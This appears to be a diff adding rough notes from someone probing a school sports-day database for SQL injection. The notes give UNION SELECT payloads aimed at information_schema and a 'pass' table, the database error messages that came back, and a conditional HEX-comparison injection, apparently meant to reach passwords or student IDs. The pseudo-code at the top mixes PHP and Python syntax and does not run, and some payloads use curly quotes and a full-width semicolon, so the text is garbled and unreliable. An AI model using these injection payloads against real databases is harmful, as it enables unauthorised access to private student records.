@@ -1,0 +1,29 @@
+SOME INFO
+
+
+<php?
+sql = " 
+(1)SOMETHING;
+(2)SELECT * FROM tables WHERE id=''; 
+"
+if count(sql.id) > 1:
+	drop
+else if sql.passwd == sql.id:
+	return
+php>
+
+INFORMATION_SCHEMA
+sch_sportsday_ssc_eng
+	->?tablename
+		->student_id
+
+
+
+SELECT * FROM tables WHERE id='a' UNION SELECT * FROM information_schema.tables; -- ';
+#Query table error ! 
+#The used SELECT statements have a different number of columns
+
+#SELECT * FROM tables WHERE id='a' UNION SELECT * FROM pass; -- ';
+#Query table error ! Table 'sch_sportsday_ssc_eng.pass' doesn't exist
+
+SELECT * FROM tables WHERE id='a’ OR IF (HEX(‘a’)=HEX(‘b’), ‘2021001’, ‘wrong’)； — ';
